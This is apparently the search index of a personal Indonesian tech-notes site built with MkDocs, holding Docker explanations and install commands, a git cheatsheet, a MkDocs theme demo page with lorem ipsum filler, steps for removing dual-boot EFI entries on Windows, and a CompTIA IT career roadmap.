\u21a9","title":"Docker"},{"location":"tips/docker/#docker","text":"","title":"Docker"},{"location":"tips/docker/#pengeertian-umum","text":"https://aws.amazon.com/id/docker/ Docker adalah platform perangkat lunak yang memungkinkan Anda membuat, menguji, dan menerapkan aplikasi dengan cepat. Docker mengemas perangkat lunak ke dalam unit standar yang disebut kontainer yang memiliki semua yang diperlukan perangkat lunak agar dapat berfungsi termasuk pustaka, alat sistem, kode, dan waktu proses. Dengan menggunakan Docker, Anda dapat dengan cepat menerapkan dan menskalakan aplikasi ke lingkungan apa pun dan yakin bahwa kode Anda akan berjalan. https://www.niagahoster.co.id/blog/docker-tutorial/ Docker adalah aplikasi open source untuk menyatukan file-file yang dibutuhkan sebuah software sehingga menjadi menjadi satu kesatuan yang lengkap dab berfungsi. Data pengaturan dan file pendukung disebut sebagai image. Selanjutnya kumpulan image digabung dalam satu wadah yang disebut Container. Docker merupakan solusi dari permasalahan yang kerap dialami para developer untuk mengembangkan aplikasi mereka agar bisa berjalan fleksibel di berbagai lingkungan. Docker menjadi perhatian para developer sejak tahun 2013, diperkenalkan oleh Solomon Hykes dalam acara PyCon US. Beberapa waktu setelahnya, Docker dirilis pertama kali pada bulan Juni tahun 2014. Docker dikembangkan oleh Solomon bersama rekannya Andrea Luzzardi dan Francois-Xavier Bourlet. Pada saat itu Docker merupakan proyek internal dotCloud. Hasilnya, saat ini Docker sudah menjadi platform populer di lingkungan para developer di berbagai belahan dunia meskipun belum terlalu populer di Indonesia. Docker sendiri merupakan sebuah perusahaan yang menyediakan layanan platform kontainer. Kemampuan yang dimiliki Docker yaitu mampu menjalankan berbagai macam aplikasi dengan konfigurasi sistem yang berbeda-beda, meskipun masih dalam satu perangkat komputer atau server.","title":"Pengeertian Umum"},{"location":"tips/docker/#fitur-docker","text":"https://www.niagahoster.co.id/blog/docker-tutorial/ Berikut ini adalah fitur Docker yang bisa Anda gunakan sesuai dengan kebutuhan. Docker Engine, digunakan untuk membangun Docker images dan membuat kontainer Docker. Docker Hub, registry yang digunakan untuk berbagai macam Docker images Docker Compose, digunakan untuk mendefinisikan aplikasi menggunakan banyak kontainer Docker. Docker untuk Mac, memungkinkan menjalankan kontainer Docker pada Mac. Docker untuk Linux, memungkinkan menjalankan kontainer Docker pada Linux. Docker untuk Windows, memungkinkan menjalankan kontainer Docker pada Windows.","title":"Fitur Docker"},{"location":"tips/docker/#cara-kerja","text":"https://aws.amazon.com/id/docker/ Docker berfungsi dengan menyediakan cara standar untuk menjalankan kode Anda. Docker adalah sistem operasi untuk kontainer. Mirip dengan cara mesin virtual memvirtualisasi (menghilangkan kebutuhan untuk secara langsung mengelola) perangkat keras server, kontainer memvirtualisasi sistem operasi server. Docker diinstal di setiap server dan memberikan perintah sederhana yang dapat Anda gunakan untuk membuat, memulai, atau menghentikan kontainer. https://www.niagahoster.co.id/blog/docker-tutorial/ Untuk lebih memahami Docker, sebaiknya Anda mengetahui cara kerja Docker. Ada beberapa komponen yang perlu Anda ketahui: Docker image, merupakan file berisi informasi dan petunjuk untuk membangun container. Image juga berfungsi untuk menggunakan dan mengirimkan informasi; Container, adalah lingkungan untuk mengemas dan menjalankan aplikasi. Ini mencakup kode, runtime, system tools, dan pengaturan. Container hanya bisa mengakses resource yang telah ditentukan dalam docker image; Docker client, yaitu tempat di mana pengguna dapat mengirimkan perintah seperti docker build, docker pull, dan docker run kepada Docker daeomon; Docker Engine Rest API, digunakan untuk berinteraksi dengan Docker daemon. Ini bisa diakses klien melalui HTTP; Docker host, menyediakan lingkungan yang lengkap untuk menjalankan aplikasi. Dia bertanggung jawab terhadap penerimaan perintah yang diberikan Docker client; Docker daemon, yaitu proses pengelolaan Docker images, kontainer, network, dan storage volumes. Docker daemon menerima request dari Docker API dan akan memprosesnya; Docker registry, wadah untuk menyimpan Docker image. Docker image akan memberi reaksi sesuai perintah yang diberikan. Misalnya saat diberi perintah docker push, docker image akan didorong atau dibagikan ke registri Docker Hub; Docker Hub adalah layanan yang disediakan untuk menemukan dan berbagi gambar container dengan tim.","title":"Cara kerja"},{"location":"tips/docker/#kapan-menggunakan-docker","text":"https://aws.amazon.com/id/docker/ Anda dapat menggunakan kontainer Docker sebagai blok penyusun inti yang menciptakan aplikasi dan platform modern. Docker mempermudah pembuatan dan menjalankan arsitektur layanan mikro terdistribusi, menerapkan kode Anda dengan pipeline integrasi dan pengiriman berkelanjutan yang terstandardisasi, membangun sistem pemrosesan data dengan skalabilitas yang tinggi, dan membuat platform yang sepenuhnya dikelola untuk pengembang Anda.","title":"Kapan menggunakan Docker"},{"location":"tips/docker/#install-ubuntu-2004","text":"apt -y install curl curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 7EA0A9C3F273FCD8 sudo add-apt-repository \"deb [arch=amd64] https://download.docker.com/linux/ubuntu $( lsb_release -cs ) stable\" sudo apt update apt-cache policy docker-ce","title":"Install : Ubuntu 20.04"},{"location":"tips/docker/#install-kali-linux","text":"install docker : sudo apt update sudo apt install -y docker.io sudo systemctl enable docker --now docker agar tdk sudo : sudo usermod -aG docker $USER cek : sudo systemctl status docker install docker-ce : printf \"%s\\n\" \"deb [arch=amd64] https://download.docker.com/linux/debian buster stable\" | sudo tee /etc/apt/sources.list.d/docker-ce.list curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add - sudo apt-key fingerprint 0EBFCD88 sudo apt update sudo apt install -y docker-ce docker-ce-cli containerd.io cek status sudo apt install -y docker-ce sudo systemctl status docker Membuat agar tidak perlu sudo lagi sudo usermod -aG docker ${ USER } su - ${ USER } id -nG Atau secara explisit menambahkan username ke group docker sudo usermod -aG docker username","title":"Install : Kali Linux"},{"location":"tips/docker/#beberapa-command","text":"docker [ option ] [ command ] [ arguments ] docker docker docker-subcommand --help docker info sudo docker run hello-world sudo docker search ubuntu sudo docker pull ubuntu sudo docker run ubuntu sudo docker images Run Docker Container Tambahkan -it untuk interactive shell access # docker run -it ubuntu bash sudo docker run -it ubuntu Managing Docker sudo docker ps sudo docker ps -a sudo docker ps -l sudo docker start 9b0db8a30ad1 ( 9b0db8a30ad1 adalah container-id ) sudo docker stop xenodochial_neumann sudo docker rm youthful_roentgen cek image : docker images hub.docker.com cari image (misal mongo db) docker pull mongo docker pull mongo:4.1 cek container : # yg running docker container ls # yg running / tdk docker container ls --all buat container docker container create --name coba-docker-mongo mongo:4.1 docker container create --name coba-docker-mongo2 mongo:4.1 start container docker container start coba-docker-mongo docker container start coba-docker-mongo2 stop container docker container stop coba-docker-mongo coba-docker-mongo2 menghapus container docker container rm coba-docker-mongo coba-docker-mongo2 membuat container export port (agar container dpt diakses dr luar) docker container create --name mongoserver1 -p 8080 :27017 mongo:4.1 docker container create --name mongoserver1 -p 8081 :27017 mongo:4.1 # 8080 : port utk luar # 27017 : port dari container menghapus image docker image rm mongo:4.1 membuat image docker secara manual misal file golang file https://github.com/ProgrammerZamanNow/belajar-docker/blob/master/main.go vim Dockerfile FROM golang:1.11.4 COPY main.go /home/syahrolus/Documents/temp/main.go CMD [ \"go\" , \"run\" , \"/home/syahrolus/Documents/temp/main.go\" ] docker build --tag coba-app-golang:1.0 . docker container create --name app1 -p 8080 :8080 app-golang:1.0 docker container start app1 upload ke registry https://hub.docker.com create a repository misal nama belajar-repo-docker docker login username : <username> password : <password> docker tag app-golang:1.0 syahrolus/app-golang:1.0 docker push syahrolus/app-golang:1.0 masuk docker attach <id_container/nama> langsung remove container ketika disconnect docker run --rm <images>","title":"Beberapa Command"},{"location":"tips/docker/#istilah","text":"sumber : https://id.wikipedia.org/wiki/Daemon *Daemon Daemon (Inggris: daemon) (IPA: /'de\u026am\u0259n/ atau /'dim\u0259n/[1]) adalah program komputer yang berjalan di latar belakang (berlawanan dengan program yang dapat dikontrol langsung) yang melakukan beberapa tugas tanpa intervensi dari pengguna. Daemon pada umumnya dimulai pada saat proses pengebutan sebagai proses, seperti halnya perangkat lunak lainnya. Contoh dari daemon adalah telnet daemon, yang terus berjalan di latar belakang, dan menunggu permintaan koneksi dari pengguna klien telnet. Telah menjadi konsensus untuk memberi nama suatu daemon dengan nama yang diakhiri oleh huruf \"d\" (diambil dari huruf pertama daemon), contohnya syslogd, daemon yang menangani log sistem; sshd, daemon yang menangani koneksi SSH), dan juga HTTPd yang merupakan daemon yang menjawab permintaan dari klien yang dilakukan melalui peramban web. Dalam lingkungan sistem operasi mirip Unix, proses parent dari sebuah daemon adalah init (PPID=1). Daemon, pada umumnya menggunakan protokol Remote Procedure Call (RPC) untuk membuka koneksi dengan klien. Windows Dalam keluarga Windows, service memiliki konsep yang sama dengan daemon. Service berjalan sebagai sebuah proses, umumnya tidak berinteraksi dengan papan kunci, monitor dan tetikus, serta pada umumnya prosesnya dimulai pada saat pengebutan.","title":"Istilah"},{"location":"tips/docker/#sumber","text":"https://aws.amazon.com/id/docker/ \u21a9 https://www.niagahoster.co.id/blog/docker-tutorial/ \u21a9","title":"Sumber"},{"location":"tips/github/","text":"Github \u00b6 Cheatsheets \u00b6 git folder git init source_code folder git log & checkout git log git log -3 git checkout c0a1dd1fd1a22e272532312930965a3054988d2a git checkout c0a1dd1fd1a22e272532312930965a3054988d2a data2.txt # back to last edited git checkout <branch_name> 3. branch git branch branch1 git branch branch2 git log git log --all --decorate --oneline --graph alias graph=\"git log --all --decorate --oneline --graph\" graph git checkout <nama_branch> merge Fast forward git merge branch1 hapus branch git branch --merged git branch -d branch1 delete tanpa merge git branch -D branch1 Three-way Merge git merge branch2 lalu ada pesan commit (membuka editor baru), lalu save & quit push branch git push origin branch1 config git config --global user.name \"<user_name_github>\" git config --global user.email \"<user_email_github>\"","title":"Github"},{"location":"tips/github/#github","text":"","title":"Github"},{"location":"tips/github/#cheatsheets","text":"git folder git init source_code folder git log & checkout git log git log -3 git checkout c0a1dd1fd1a22e272532312930965a3054988d2a git checkout c0a1dd1fd1a22e272532312930965a3054988d2a data2.txt # back to last edited git checkout <branch_name> 3. branch git branch branch1 git branch branch2 git log git log --all --decorate --oneline --graph alias graph=\"git log --all --decorate --oneline --graph\" graph git checkout <nama_branch> merge Fast forward git merge branch1 hapus branch git branch --merged git branch -d branch1 delete tanpa merge git branch -D branch1 Three-way Merge git merge branch2 lalu ada pesan commit (membuka editor baru), lalu save & quit push branch git push origin branch1 config git config --global user.name \"<user_name_github>\" git config --global user.email \"<user_email_github>\"","title":"Cheatsheets"},{"location":"tips/guide-this-website/","text":"Welcome to MkDocs \u00b6 For full documentation visit material for mkdocs Commands \u00b6 mkdocs new [dir-name] - Create a new project. mkdocs serve - Start the live-reloading docs server. mkdocs build - Build the documentation site. mkdocs -h - Print help message and exit. Project layout \u00b6 mkdocs.yml # The configuration file. docs/ index.md # The documentation homepage. ... # Other markdown pages, images and other files. Color \u00b6 0.2.0 \u00b7 Default: indigo The primary color is used for the header, the sidebar, text links and several other components. In order to change the primary color, set the following value in mkdocs.yml to a valid color name: theme : palette : primary : indigo Click on a tile to change the primary color: red pink purple deep purple indigo blue light blue cyan teal green light green lime yellow amber orange deep orange brown grey blue grey black white var buttons = document.querySelectorAll(\"button[data-md-color-primary]\") buttons.forEach(function(button) { button.addEventListener(\"click\", function() { var attr = this.getAttribute(\"data-md-color-primary\") document.body.setAttribute(\"data-md-color-primary\", attr) var name = document.querySelector(\"#__code_2 code span.l\") name.textContent = attr.replace(\"-\", \" \") }) }) mbuh1 \u00b6 The HTML specification is maintained by the W3C . theme : palette : # (1)! - scheme : default toggle : icon : material/toggle-switch-off-outline # (2)! name : Switch to dark mode - scheme : slate # (3)! toggle : icon : material/toggle-switch name : Switch to light mode Note that the theme.palette setting is now defined as a list. Enter a few keywords to find the perfect icon using our [icon search] and click on the shortcode to copy it to your clipboard: With 2 (color schemes) x 21 (primary colors) x 17 (accent color) = 714 combinations, it's impossible to ensure that all configurations provide a good user experience (e.g. yellow on light background ). Make sure that the color combination of your choosing provides enough contrast and tweak CSS variables where necessary. The following properties must be set for each toggle: icon Default: none \u00b7 Required \u2013 This property must point to a valid icon path referencing any icon bundled with the theme, or the build will not succeed. Some popular combinations: + \u2013 material/toggle-switch-off-outline + material/toggle-switch + \u2013 material/weather-sunny + material/weather-night + \u2013 material/eye-outline + material/eye + \u2013 material/lightbulb-outline + material/lightbulb + \u2013 material/brightness-4 + material/brightness-7 name Default: none \u00b7 Required \u2013 This property is used as the toggle's title attribute and should be set to a discernable name to improve accessibility. It will appear on mouse hover. Info Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Info Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Let's say you're YouTube , and want to set the primary color to your brand's palette. Just add: docs/stylesheets/extra.css mkdocs.yml : root { --md-primary-fg-color : #EE0F0F ; --md-primary-fg-color--light : #ECB7B7 ; --md-primary-fg-color--dark : #90030C ; } extra_css : - stylesheets/extra.css Note Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Phasellus posuere in sem ut cursus (1) Lorem ipsum dolor sit amet, (2) consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. I'm an annotation! I'm an annotation as well! note | abstract , summary , tldr | info , todo | tip , hint , important | success , check , done | question , help , faq | warning , caution , attention | failure , fail , missing | danger , error | bug | example | quote , cite Text with annotations Lorem ipsum dolor sit amet, (1) consectetur adipiscing elit. { .annotate } 1. :man_raising_hand: I'm an annotation! I can contain `code` , __formatted text__, images, ... basically anything that can be expressed in Markdown. Lorem ipsum dolor sit amet, (1) consectetur adipiscing elit. I'm an annotation! I can contain code , formatted text , images, ... basically anything that can be written in Markdow. Lorem ipsum dolor sit amet, (1) consectetur adipiscing elit. I'm an annotation! (1) I'm an annotation as well! Tab 1 Tab 2 Lorem ipsum dolor sit amet, (1) consectetur adipiscing elit. I'm an annotation! Phasellus posuere in sem ut cursus (1) I'm an annotation as well! Lorem ipsum dolor sit amet, (1) consectetur adipiscing elit. I'm an annotation! theme : features : - content.code.annotate # (1) I'm a code annotation! I can contain code , formatted text , images, ... basically anything that can be written in Markdown. bubble_sort.py def bubble_sort ( items ): for i in range ( len ( items )): for j in range ( len ( items ) - 1 - i ): if items [ j ] > items [ j + 1 ]: items [ j ], items [ j + 1 ] = items [ j + 1 ], items [ j ] tes # (1) Tes Note Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Note Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Example Unordered List Ordered List List, unordered * Sed sagittis eleifend rutrum * Donec vitae suscipit est * Nulla tempor lobortis orci List, ordered 1. Sed sagittis eleifend rutrum 2. Donec vitae suscipit est 3. Nulla tempor lobortis orci Method Description GET Fetch resource PUT Update resource DELETE Delete resource graph LR A[Start] --> B{Error?}; B -->|Yes| C[Hmm...]; C --> D[Debug]; D --> B; B ---->|No| E[Yay!]; sequenceDiagram Alice->>John: Hello John, how are you? loop Healthcheck John->>John: Fight against hypochondria end Note right of John: Rational thoughts! John-->>Alice: Great! John->>Bob: How about you? Bob-->>John: Jolly good! stateDiagram-v2 state fork_state <<fork>> [*] --> fork_state fork_state --> State2 fork_state --> State3 state join_state <<join>> State2 --> join_state State3 --> join_state join_state --> State4 State4 --> [*] classDiagram Person <|-- Student Person <|-- Professor Person : +String name Person : +String phoneNumber Person : +String emailAddress Person: +purchaseParkingPass() Address \"1\" <-- \"0..1\" Person:lives at class Student{ +int studentNumber +int averageMark +isEligibleToEnrol() +getSeminarsTaken() } class Professor{ +int salary } class Address{ +String street +String city +String state +int postalCode +String country -validate() +outputAsLabel() } erDiagram CUSTOMER ||--o{ ORDER : places ORDER ||--|{ LINE-ITEM : contains CUSTOMER }|..|{ DELIVERY-ADDRESS : uses Lorem ipsum 1 dolor sit amet, consectetur adipiscing elit. 2 Text can be deleted and replacement text added . This can also be combined into one a single operation. Highlighting is also possible and comments can be added inline . Formatting can also be applied to blocks by putting the opening and closing tags on separate lines and adding new lines between the tags and the content. H 2 0 A T A Ctrl + Alt + Del Image caption Nulla et rhoncus turpis. Mauris ultricies elementum leo. Duis efficitur accumsan nibh eu mattis. Vivamus tempus velit eros, porttitor placerat nibh lacinia sed. Aenean in finibus diam. Duis mollis est eget nibh volutpat, fermentum aliquet dui mollis. Nam vulputate tincidunt fringilla. Nullam dignissim ultrices urna non auctor. Vivamus id mi enim. Integer id turpis sapien. Ut condimentum lobortis sagittis. Aliquam purus tellus, faucibus eget urna at, iaculis venenatis nulla. Vivamus a pharetra leo. Vivamus venenatis porttitor tortor sit amet rutrum. Pellentesque aliquet quam enim, eu volutpat urna rutrum a. Nam vehicula nunc mauris, a ultricies libero efficitur sed. Morbi eget dapibus felis. Vivamus venenatis porttitor tortor sit amet rutrum. Pellentesque aliquet quam enim, eu volutpat urna rutrum a. Mauris dictum mi lacus Ut sit amet placerat ante Suspendisse ac eros arcu Lorem ipsum dolor sit amet Sed sagittis eleifend rutrum. Donec vitae suscipit est. Nullam tempus tellus non sem sollicitudin, quis rutrum leo facilisis. Cras arcu libero Aliquam metus eros, pretium sed nulla venenatis, faucibus auctor ex. Proin ut eros sed sapien ullamcorper consequat. Nunc ligula ante. Duis mollis est eget nibh volutpat, fermentum aliquet dui mollis. Nam vulputate tincidunt fringilla. Nullam dignissim ultrices urna non auctor. Lorem ipsum dolor sit amet, consectetur adipiscing elit Vestibulum convallis sit amet nisi a tincidunt In hac habitasse platea dictumst In scelerisque nibh non dolor mollis congue sed et metus Praesent sed risus massa Aenean pretium efficitur erat, donec pharetra, ligula non scelerisque Send Search \u00b6 Tip: Enter some keywords to find icons and emojis and click on the shortcode to copy it to your clipboard. Lorem ipsum dolor sit amet, consectetur adipiscing elit. \u21a9 Lorem ipsum dolor sit amet, consectetur adipiscing elit. \u21a9","title":"Guide This Web"},{"location":"tips/guide-this-website/#welcome-to-mkdocs","text":"For full documentation visit material for mkdocs","title":"Welcome to MkDocs"},{"location":"tips/guide-this-website/#commands","text":"mkdocs new [dir-name] - Create a new project. mkdocs serve - Start the live-reloading docs server. mkdocs build - Build the documentation site. mkdocs -h - Print help message and exit.","title":"Commands"},{"location":"tips/guide-this-website/#project-layout","text":"mkdocs.yml # The configuration file. docs/ index.md # The documentation homepage. ... # Other markdown pages, images and other files.","title":"Project layout"},{"location":"tips/guide-this-website/#color","text":"0.2.0 \u00b7 Default: indigo The primary color is used for the header, the sidebar, text links and several other components. In order to change the primary color, set the following value in mkdocs.yml to a valid color name: theme : palette : primary : indigo Click on a tile to change the primary color: red pink purple deep purple indigo blue light blue cyan teal green light green lime yellow amber orange deep orange brown grey blue grey black white var buttons = document.querySelectorAll(\"button[data-md-color-primary]\") buttons.forEach(function(button) { button.addEventListener(\"click\", function() { var attr = this.getAttribute(\"data-md-color-primary\") document.body.setAttribute(\"data-md-color-primary\", attr) var name = document.querySelector(\"#__code_2 code span.l\") name.textContent = attr.replace(\"-\", \" \") }) })","title":"Color"},{"location":"tips/guide-this-website/#mbuh1","text":"The HTML specification is maintained by the W3C . theme : palette : # (1)! - scheme : default toggle : icon : material/toggle-switch-off-outline # (2)! name : Switch to dark mode - scheme : slate # (3)! toggle : icon : material/toggle-switch name : Switch to light mode Note that the theme.palette setting is now defined as a list. Enter a few keywords to find the perfect icon using our [icon search] and click on the shortcode to copy it to your clipboard: With 2 (color schemes) x 21 (primary colors) x 17 (accent color) = 714 combinations, it's impossible to ensure that all configurations provide a good user experience (e.g. yellow on light background ). Make sure that the color combination of your choosing provides enough contrast and tweak CSS variables where necessary. The following properties must be set for each toggle: icon Default: none \u00b7 Required \u2013 This property must point to a valid icon path referencing any icon bundled with the theme, or the build will not succeed. Some popular combinations: + \u2013 material/toggle-switch-off-outline + material/toggle-switch + \u2013 material/weather-sunny + material/weather-night + \u2013 material/eye-outline + material/eye + \u2013 material/lightbulb-outline + material/lightbulb + \u2013 material/brightness-4 + material/brightness-7 name Default: none \u00b7 Required \u2013 This property is used as the toggle's title attribute and should be set to a discernable name to improve accessibility. It will appear on mouse hover. Info Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Info Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Let's say you're YouTube , and want to set the primary color to your brand's palette. Just add: docs/stylesheets/extra.css mkdocs.yml : root { --md-primary-fg-color : #EE0F0F ; --md-primary-fg-color--light : #ECB7B7 ; --md-primary-fg-color--dark : #90030C ; } extra_css : - stylesheets/extra.css Note Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Phasellus posuere in sem ut cursus (1) Lorem ipsum dolor sit amet, (2) consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. I'm an annotation! I'm an annotation as well! note | abstract , summary , tldr | info , todo | tip , hint , important | success , check , done | question , help , faq | warning , caution , attention | failure , fail , missing | danger , error | bug | example | quote , cite Text with annotations Lorem ipsum dolor sit amet, (1) consectetur adipiscing elit. { .annotate } 1. :man_raising_hand: I'm an annotation! I can contain `code` , __formatted text__, images, ... basically anything that can be expressed in Markdown. Lorem ipsum dolor sit amet, (1) consectetur adipiscing elit. I'm an annotation! I can contain code , formatted text , images, ... basically anything that can be written in Markdow. Lorem ipsum dolor sit amet, (1) consectetur adipiscing elit. I'm an annotation! (1) I'm an annotation as well! Tab 1 Tab 2 Lorem ipsum dolor sit amet, (1) consectetur adipiscing elit. I'm an annotation! Phasellus posuere in sem ut cursus (1) I'm an annotation as well! Lorem ipsum dolor sit amet, (1) consectetur adipiscing elit. I'm an annotation! theme : features : - content.code.annotate # (1) I'm a code annotation! I can contain code , formatted text , images, ... basically anything that can be written in Markdown. bubble_sort.py def bubble_sort ( items ): for i in range ( len ( items )): for j in range ( len ( items ) - 1 - i ): if items [ j ] > items [ j + 1 ]: items [ j ], items [ j + 1 ] = items [ j + 1 ], items [ j ] tes # (1) Tes Note Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Note Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod nulla. Curabitur feugiat, tortor non consequat finibus, justo purus auctor massa, nec semper lorem quam in massa. Example Unordered List Ordered List List, unordered * Sed sagittis eleifend rutrum * Donec vitae suscipit est * Nulla tempor lobortis orci List, ordered 1. Sed sagittis eleifend rutrum 2. Donec vitae suscipit est 3. Nulla tempor lobortis orci Method Description GET Fetch resource PUT Update resource DELETE Delete resource graph LR A[Start] --> B{Error?}; B -->|Yes| C[Hmm...]; C --> D[Debug]; D --> B; B ---->|No| E[Yay!]; sequenceDiagram Alice->>John: Hello John, how are you? loop Healthcheck John->>John: Fight against hypochondria end Note right of John: Rational thoughts! John-->>Alice: Great! John->>Bob: How about you? Bob-->>John: Jolly good! stateDiagram-v2 state fork_state <<fork>> [*] --> fork_state fork_state --> State2 fork_state --> State3 state join_state <<join>> State2 --> join_state State3 --> join_state join_state --> State4 State4 --> [*] classDiagram Person <|-- Student Person <|-- Professor Person : +String name Person : +String phoneNumber Person : +String emailAddress Person: +purchaseParkingPass() Address \"1\" <-- \"0..1\" Person:lives at class Student{ +int studentNumber +int averageMark +isEligibleToEnrol() +getSeminarsTaken() } class Professor{ +int salary } class Address{ +String street +String city +String state +int postalCode +String country -validate() +outputAsLabel() } erDiagram CUSTOMER ||--o{ ORDER : places ORDER ||--|{ LINE-ITEM : contains CUSTOMER }|..|{ DELIVERY-ADDRESS : uses Lorem ipsum 1 dolor sit amet, consectetur adipiscing elit. 2 Text can be deleted and replacement text added . This can also be combined into one a single operation. Highlighting is also possible and comments can be added inline . Formatting can also be applied to blocks by putting the opening and closing tags on separate lines and adding new lines between the tags and the content. H 2 0 A T A Ctrl + Alt + Del Image caption Nulla et rhoncus turpis. Mauris ultricies elementum leo. Duis efficitur accumsan nibh eu mattis. Vivamus tempus velit eros, porttitor placerat nibh lacinia sed. Aenean in finibus diam. Duis mollis est eget nibh volutpat, fermentum aliquet dui mollis. Nam vulputate tincidunt fringilla. Nullam dignissim ultrices urna non auctor. Vivamus id mi enim. Integer id turpis sapien. Ut condimentum lobortis sagittis. Aliquam purus tellus, faucibus eget urna at, iaculis venenatis nulla. Vivamus a pharetra leo. Vivamus venenatis porttitor tortor sit amet rutrum. Pellentesque aliquet quam enim, eu volutpat urna rutrum a. Nam vehicula nunc mauris, a ultricies libero efficitur sed. Morbi eget dapibus felis. Vivamus venenatis porttitor tortor sit amet rutrum. Pellentesque aliquet quam enim, eu volutpat urna rutrum a. Mauris dictum mi lacus Ut sit amet placerat ante Suspendisse ac eros arcu Lorem ipsum dolor sit amet Sed sagittis eleifend rutrum. Donec vitae suscipit est. Nullam tempus tellus non sem sollicitudin, quis rutrum leo facilisis. Cras arcu libero Aliquam metus eros, pretium sed nulla venenatis, faucibus auctor ex. Proin ut eros sed sapien ullamcorper consequat. Nunc ligula ante. Duis mollis est eget nibh volutpat, fermentum aliquet dui mollis. Nam vulputate tincidunt fringilla. Nullam dignissim ultrices urna non auctor. Lorem ipsum dolor sit amet, consectetur adipiscing elit Vestibulum convallis sit amet nisi a tincidunt In hac habitasse platea dictumst In scelerisque nibh non dolor mollis congue sed et metus Praesent sed risus massa Aenean pretium efficitur erat, donec pharetra, ligula non scelerisque Send","title":"mbuh1"},{"location":"tips/guide-this-website/#search","text":"Tip: Enter some keywords to find icons and emojis and click on the shortcode to copy it to your clipboard. Lorem ipsum dolor sit amet, consectetur adipiscing elit. \u21a9 Lorem ipsum dolor sit amet, consectetur adipiscing elit. \u21a9","title":"Search"},{"location":"tips/hapus-dualboot/","text":"Hapus Dual/Triple/dst Boot dari Windows \u00b6 ! pastikan hapus dulu disk partisi dari pc manager buka cmd as administrator diskpart list disk jika cuman masang 1 disk, maka pilih disk 0 jika masang >1 disk, maka pilih disk yg sub bagiannya mau dihapus select disk 0 list volume pilih yg infonya 'system' misal didapat info system pada volume 4 select volume 4 assign letter=z exit z: dir cd efi dir rmdir /S <yg_mau_dihapus> misal : rmdir /S ubuntu exit (restart PC)","title":"Hapus Dual Boot"},{"location":"tips/hapus-dualboot/#hapus-dualtripledst-boot-dari-windows","text":"! pastikan hapus dulu disk partisi dari pc manager buka cmd as administrator diskpart list disk jika cuman masang 1 disk, maka pilih disk 0 jika masang >1 disk, maka pilih disk yg sub bagiannya mau dihapus select disk 0 list volume pilih yg infonya 'system' misal didapat info system pada volume 4 select volume 4 assign letter=z exit z: dir cd efi dir rmdir /S <yg_mau_dihapus> misal : rmdir /S ubuntu exit (restart PC)","title":"Hapus Dual/Triple/dst Boot dari Windows"},{"location":"tips/itcareer/","text":"IT Career Roadmap \u00b6 CompTIA \u00b6 sumber : https://www.comptia.org Beginer \u00b6 $80251/yr 18709 looking Job Titles : System/s Administrator Network Engineer System/s Engineer Required skills at this level : Scan and assess network for vulnerabilities Monitor network traffic for unusual activity Investigate a violation when a breach occurs Install and use software to protect sensitive information Prepare reports that document security breaches Research new security technology Help end-users when they need to install or learn about new products and procedures Intermediate \u00b6 $94,379 53,739 looking Job Titles : Security Analyst Security Engineer Pen Tester Required skills at this level : Manage and configure tools to monitor network activity Conduct penetration testing Analyze reports from tools to identify unusual network behavior Plan and recommend changes to increase the security of the network Apply security patches to protect the network Help end-users when they need to install or learn about new products and procedures Train beginner cybersecurity professionals Advance \u00b6 $105,033 44,331 looking Job Titles : Senior Security Engineer Senior Security Analyst CISO Required skills at this level : Manage and configure tools to monitor network activity Research the latest IT security trends Develop security standards and best practices for the organization Recommend security enhancements to management or senior staff Develop and update business continuity and disaster recovery protocols Help end-users when they need to install or learn about new products and procedures Manage and train team Certifications \u00b6 Beginer : CompTIA Network+ CompTIA Security+ Partner Certifications Intermediate : CompTIA Project+ CompTIA CySA+ CompTIA PenTest+ Partner Certifications Advance CompTIA CASP+ Partner Certifications Desc Certification \u00b6 CompTIA It Network+ Certification : The table below lists the domains measured by the full examination and the extent to which they are represented. Domain and percentage of examination : Networking Concepts 23% Infrastructure 18% Network Operations 17% Network Security 20% Network Troubleshooting and Tools 22% Total 100% CompTIA Security+ Certification : The table below lists the domains measured by the full examination and the extent to which they are represented. Domain and percentage of examination : Threats, Attacks and Vulnerabilities 21% Technologies and Tools 22% Architecture and Design 15% Identity and Access Management 16% Risk Management 14% Cryptography and PKI 12% Total 100% CompTIA CySA+ Certification : The table below lists the domains measured by the full examination and the extent to which they are represented. Domain and percentage of examination : Core 1 (220-1001) Threat and Vulnerability Management 22% Software and Systems Security 18% Security Operations and Monitoring 25% Incident Response 22% Compliance and Assessment 13% Total 100% CompTIA Project+ Certification : The table below lists the domains measured by the full examination and the extent to which they are represented. Domain and percentage of examination : Core 1 (220-1001) Project Basics 36% Project Constraints 17% Communication and Change Management 26% Project Tools and Documentation 21% Total 100% CompTIA PenTest+ Certification : The table below lists the domains measured by the full examination and the extent to which they are represented. 